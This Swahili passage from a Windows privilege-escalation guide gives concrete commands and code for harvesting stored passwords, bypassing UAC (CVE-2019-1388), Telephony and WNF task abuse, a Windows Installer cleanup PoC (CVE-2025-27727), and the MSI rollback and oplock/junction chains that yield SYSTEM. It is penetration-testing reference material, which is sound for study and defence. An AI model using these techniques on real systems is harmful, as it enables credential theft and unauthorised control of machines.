Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kwamba `key4.db` na `logins.json` za wasifu ni faili zinazooanishwa za ufunguo na login zilizofumbuliwa. Kuwepo kwake kunatoa tu kidokezo: angalia kama faili zote mbili zinasomeka, kama kuna maingizo yaliyohifadhiwa, na kama Primary Password inalinda ufunguo kabla ya kuhitimisha kuwa vitambulisho vinaweza kutumika. Ikiwa kitambulisho kilichopatikana ni cha akaunti ya domain, kagua kando haki za udhibiti wa vikundi zinazotumika za akaunti hiyo na haki za kikundi za [kusoma au kufumbua nenosiri la LAPS](../active-directory-methodology/laps.md); vitu vya kivinjari pekee havithibitishi njia ya kupata haki za msimamizi.

Tools za kutoa manenosiri kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Kuandika Juu ya COM DLL**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo endeshi wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)** na kila kipengele hutoa utendaji kupitia kiolesura kimoja au zaidi, vinavyotambuliwa kupitia interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry ya mtoto **InProcServer32** iliyo na **thamani chaguomsingi** inayoelekeza kwenye **DLL** na thamani inayoitwa **ThreadingModel**, ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Vivinjari - Kuandika Juu ya COM DLL: Ndani ya CLSIDs za registry hii unaweza kupata registry ya mtoto InProcServer32 iliyo na thamani chaguomsingi inayoelekeza kwenye DLL na thamani...](<../../images/image (729).png>)

Kimsingi, ukiweza **kuandika juu ya DLL yoyote** itakayotekelezwa, unaweza **kupandisha haki** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama mbinu ya kudumu, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa Jumla wa Nenosiri kwenye Faili na Registry**

**Tafuta maudhui ya faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta registry kwa majina ya funguo na nywila**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **kuendesha kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine bora ya kutoa password kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **passwords** za zana kadhaa zinazohifadhi data hii kama maandishi ya kawaida (PuTTY, WinSCP, FileZilla, SuperPuTTY na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) kwa **ufikiaji kamili**. Mchakato huohuo **pia huunda mchakato mpya** (`CreateProcess()`) **wenye haki za chini lakini unaorithi handles zote zilizo wazi za mchakato mkuu**.\
Kisha, ikiwa una **ufikiaji kamili wa mchakato wenye haki za chini**, unaweza kuchukua **handle iliyo wazi ya mchakato wenye haki za juu ulioundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia handles zaidi zilizo wazi za michakato na threads zilizorithiwa zikiwa na viwango tofauti vya ruhusa (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya michakato.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachowaruhusu michakato isiyohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu hufafanuliwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyoanzisha pipe inaweza **kujifanya kuwa** **client**, mradi ina haki zinazohitajika za **SeImpersonate**. Kutambua **mchakato wenye haki za juu** unaowasiliana kupitia pipe unayoweza kuiga hukupa fursa ya **kupata haki za juu zaidi** kwa kujifanya kuwa mchakato huo pindi unapoingiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, miongozo muhimu inapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, zana ifuatayo hukuruhusu **kunasa mawasiliano ya named pipe kwa kutumia zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii hukuruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client aliyeidhinishwa kwa mbali anaweza kutumia vibaya njia ya tukio la async inayotegemea mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa baiti 4** kwenye faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuiandikia, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mchakato kamili:

- `ClientAttach` yenye `pszDomainUser` iliyowekwa kuwa njia iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kwa uandishi wa tukio la async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambulizi kutoka `Initialize` kwenye handle hiyo. Sajili programu ya line kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata matukio kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima huduma ili kurudia uandishi unaotabirika.
- Jiongeze kwenye `[TapiAdministrators]` ndani ya `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukitumia njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Viungo vya Markdown vinavyoweza kubonyezwa na kutumwa kwa `ShellExecuteExW` vinaweza kuwasha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambulizi kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines kwa nywila**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au michakato mingine inayoendeshwa ambayo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za michakato kila sekunde mbili na kulinganisha hali ya sasa na hali iliyotangulia, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwenye michakato

## Kutoka kwa Mtumiaji mwenye Haki za Chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewashwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.

Hii inafanya iwezekane kuongeza haki na kukwepa UAC kwa wakati mmoja kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato imetiwa saini na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii ifuatayo:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma hii ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kuweka Directory Junctions kwenye Root Inayohudumiwa

Programu inaweza kuunda subdirectory ya upload yenye jina linalotabirika, kuandika humo filename iliyotolewa na mtumiaji, kisha kuichakata faili hiyo. Ikiwa mtumiaji mwenye ruhusa ndogo anaweza kufuta na kubadilisha subdirectory hiyo na NTFS junction kabla ya maandishi ya upande wa server, maandishi hayo yanaweza kufuata junction hadi kwenye directory inayohudumiwa na web server. Script iliyowekwa humo inaweza kuendeshwa kwa utambulisho wa web-service ikiwa server hutekeleza aina hiyo ya faili. Huu ni mpaka wa arbitrary-write unaotegemea programu mahususi; directory ya upload inayoweza kuandikiwa au junction iliyopo pekee havithibitishi uwezekano huo.

Kagua jinsi path halisi inavyoundwa na muda wa hatua hizo katika upload handler, ruhusa halisi za mtumiaji za kufuta/kuunda subdirectory, ACLs halisi za destination, iwapo writer hufuata reparse points, na iwapo web server hutekeleza faili katika destination hiyo. Thibitisha utambulisho wa mchakato wa writer na wa web server kando. Ukaguzi usioingilia mfumo unaweza kuonyesha ACLs za directory na metadata ya reparse, lakini hauwezi kubaini tabia ya handler au mabadiliko yajayo ya junction. Ikiwa utekelezaji utafanyika katika akaunti ya service, kagua **token halisi ya mchakato** kabla ya kuchunguza njia tofauti inayotumia token privileges.

## Usafishaji wa scheduled task yenye ruhusa za juu unaochochewa na WNF

Scheduled task inayokataa kuendeshwa kwa mikono bado inaweza kuwa na kichocheo kinachopatikana kwa mtumiaji asiye na ruhusa za juu. Unakagua task yenye ruhusa za juu, export XML yake na uchunguze **triggers zote**, pamoja na task DACL, principal na action. Hasa, `WnfStateChangeTrigger` hutaja state ya Windows Notification Facility (WNF); ikiwa state hiyo inayoweza kulindwa inaruhusu mtumiaji wa sasa kuchapisha update, mtumiaji anaweza kuanzisha task kwa njia isiyo ya moja kwa moja chini ya utambulisho wake uliosanidiwa, licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, Recall task ya `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ilikubali updates za WNF state `7508BCA32C079E41` kutoka kwa mtumiaji wa kawaida, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata Recall ilipokuwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kujaribu ufikikaji, tafuta `ZwUpdateWnfStateData` katika `ntdll.dll`, tuma sasisho tupu kwa jina la state lenye baiti nane, kisha linganisha hali ya matokeo na data ya mara ya mwisho task ilipoendeshwa au shughuli za Procmon. Probe ifuatayo iliyofupishwa hutumia mfuatano wa baiti kutoka kwenye mfano wa task ya Recall; badilisha baiti hizo kwa zile zilizosafirishwa kwa task inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha cleanup ya kujirudia kuwa ufutaji wenye ruhusa za juu

Primitive yenye manufaa si trigger pekee, bali ni utaratibu wa cleanup wenye ruhusa za juu unaokubali directory inayodhibitiwa na mshambuliaji. Fuatilia operesheni kuanzia enumeration hadi mabadiliko ya mwisho: ugunduzi wa profile/session, children waliochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria thabiti kwamba pathname iliyokaguliwa awali itafuatiliwa kwa kujirudia baadaye. Ikiwa descendants hazifunguliwi zikilinganishwa na trusted directory handles na kuthibitishwa kabla ya kufutwa, mshambuliaji anaweza kubadilisha jinsi njia inavyotatuliwa kati ya enumeration na matumizi.<sup>[[43]](#references)</sup>

Oanisha WNF trigger na [oplock, junction na Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) iliyoelezwa hapa chini: oplock husimamisha cleaner baada ya kuchagua child halali, huku ancestor inayoweza kuandikwa ikibadilishwa ili privileged delete inapoendelea tena itatue njia kupitia `\RPC Control` hadi kwenye target iliyolindwa. Katika mnyororo wa Recall, hii ilisababisha kufutwa kwa `C:\Config.Msi` na SYSTEM, jambo lililohitajika kwa mbinu ya MSI rollback iliyoandikwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Descendants zilizopachikwa hupita marekebisho ya juu juu ya reparse point

Kuthibitisha tu root inayodhibitiwa na mshambuliaji na child yake ya moja kwa moja hakulindi ufutaji wa kujirudia unaotumia pathname. Acha objects hizo zilizokaguliwa ziwe halali, kisha hamishia junction/oplock substitution ndani ya child ya ziada iliyo chini yake; `IFileOperation::DeleteItem` hatimaye hufikia descendant ambayo haikuthibitishwa na kufuata target yake mpya. CVE-2026-20941 ilitokana hasa na aina hii ya marekebisho yasiyokamilika baada ya patch ya kwanza ya Recall kuthibitisha `UKP` na directory yenye umbo la GUID lakini ikaacha operesheni ya zamani ya ufutaji wa kujirudia.<sup>[[43]](#references)</sup>

Muundo salama ni kufungua **kila descendant** ikilinganishwa na trusted directory handle ambayo tayari imefunguliwa, kupata na kuthibitisha path/object ya mwisho iliyotatuliwa, kisha kutumia deletion disposition kwenye handle hiyo iliyothibitishwa. Usithibitishe prefix kisha urudi kwenye ufutaji wa kujirudia unaotegemea path. Wakati wa kukagua patch, kagua pia structures kwenye call site halisi: katika hali hii, ukaguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo `null` na jina relative la `{GUID}\\secure_file.lock`, hivyo ukakanusha matokeo ya decompiler yaliyopotosha yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Kutoka Kufuta/Kuhamisha/Kubadilisha Jina Folder Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**katika chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) pamoja na exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili linatumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha files halali na kuweka zenye madhara wakati wa mchakato wa kusanidua. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer yenye madhara** itakayotumiwa kuteka folder ya `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa kusanidua vifurushi vingine vya MSI; rollback files hizo zitakuwa zimebadilishwa ili ziwe na malicious payload.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Client mwenye ruhusa ndogo anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia COM object ya `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilitambua calls husika za `IMsiServer` kama `MsiBeginTransactionW` kwenye vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na offsets hizi zimepatikana kwa reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtu asiye administrator, `SetEEUIDirectoryAndFilter` huiga utambulisho wa caller wakati tu wa kufungua njia iliyotolewa kwa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hii inathibitisha kuwa caller anaweza kufuta directory na huepusha kufuata reparse point, lakini **haihusishi** file object iliyokaguliwa na cleanup ya baadaye wala kuthibitisha kuwa Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` hupanga njia kama folder bila kujali argument ya filter ya caller. Huduma huandika thamani ya `REG_DWORD` yenye jina maalum chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni njia inayodhibitiwa na caller, na data `0x00000002` ni flag ya folder. Kisha `CleanupTempPackages(NULL, FALSE)` huanzisha cleanup moja kwa moja. Worker yake yenye ruhusa za juu huorodhesha thamani za registry na kupitisha entries za folder kwa `FDeleteFolder` inayofuta kwa kujirudia, bila kukagua chanzo cha path. Ikiwa uondoaji wa kawaida hautafaulu, code pia huita `LockdownPath`, huondoa file attributes, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano mdogo wa calls uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive muhimu ni kutumia tena path badala ya kuelekeza upya junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, iondoe, kisha Windows Installer iunde tena path hiyo hiyo baadaye ikiwa na rollback data iliyolindwa. Usafishaji huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hupita mpaka uliokusudiwa wa `FILE_FLAG_OPEN_REPARSE_POINT` na uzuiaji wa kuamini redirection, kwa sababu haihitajiki reparse point.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa kwenye rollback chain iliyo hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle yenye ruhusa ya `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL inayoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea tena.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha path hii kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` isiite `ScheduleFileOrFolderDelete` kipengele kipya cha kudhibiti kinapowashwa. COM call bado inaweza kurudisha success, lakini haiweki tena path inayodhibitiwa na mshambuliaji kwenye `TempPackages`. Sakinisha masasisho ya usalama ya Windows ya Aprili 2025 badala ya kutumia mafanikio ya method return kama kipimo cha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu hiyo kwa muhtasari ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (k.m., `dummy.txt`) kwenye folder inayoweza kuandikika (`TARGETDIR`).
    - Weka alama ya **"UAC Compliant"** kwenye installer ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ya faili ikiwa wazi baada ya usakinishaji.

- Hatua ya 2: Anza Uninstall
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (rollback backups).
    - **Kagua open file handle mara kwa mara** kwa kutumia `GetFinalPathNameByHandle` ili kubaini faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Usawazishaji Maalum
    - `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutuma ishara faili ya `.rbf` inapoandikwa.
        - Kisha **husubiri** tukio lingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitumwa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huizuia isifutwe**.
    - Kisha **tuma ishara ya majibu** ili uninstall ikamilike.
    - Windows Installer hushindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kutekwa.

> Katika hatua hii, **anzisha vulnerability ya kufuta folder yoyote kwa kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Badilisha Rollback Scripts na Zenye Madhara**

- Hatua ya 6: Unda Upya `C:\Config.Msi` Ikiwa na ACL Dhaifu
    - Unda upya folder ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (k.m., Everyone:F), na **acha handle wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiwa na:
        - `TARGETDIR`: Eneo linaloweza kuandikika.
        - `ERROROUT`: Variable inayosababisha hitilafu ya lazima.
    - Usakinishaji huu utatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itakapotokea.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutuma ishara ya tukio `.rbs` inapoundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea tukio la `.rbs created`:
        - Windows Installer **huweka tena ACL kali** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACLs **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` na **rollback script bandia** inayoelekeza Windows:
        - Kurejesha faili yako ya `.rbf` (DLL yenye madhara) kwenye **eneo lenye upendeleo** (k.m., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` bandia yenye **payload DLL yenye madhara ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya tukio la sync ili installer iendelee.
    - **Type 19 custom action (`ErrorOut`)** imesanidiwa **kufeli usakinishaji kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako yenye madhara.
        - Hunakili DLL yako ya `.rbf` hadi eneo lengwa.
    - Sasa una **DLL yako yenye madhara kwenye path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Code ya SYSTEM
    - Endesha **auto-elevated binary** inayoaminika (k.m., `osk.exe`) inayopakia DLL uliyoiteka.
    - **Boom**: Code yako inatekelezwa **kama SYSTEM**.


### Kutoka Kufuta/Kuhamisha/Kubadilisha Jina Faili Yoyote hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) inadhania kuwa unaweza kufuta **folder nzima** (k.m., `C:\Config.Msi`). Lakini je, ikiwa vulnerability yako inaruhusu tu **kufuta faili yoyote**?

Unaweza kutumia **NTFS internals**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya faharasa** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama vile:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Vipi ikiwa primitive yako haikuruhusu kufuta file/folder yoyote kiholela, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** mchakato wenye privilege unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha SYSTEM process (mf., `SilentCleanup`)
- Process hii huchanganua folda (mf., `%TEMP%`) na kujaribu kufuta yaliyomo.
- Inapofikia `file1.txt`, **oplock huanzishwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya oplock callback – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huacha `folder1` tupu bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — hilo lingeachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga mkondo wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua ya 5: Achia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka kwa Uwezo wa Kuunda Folda Popote hadi DoS ya Kudumu

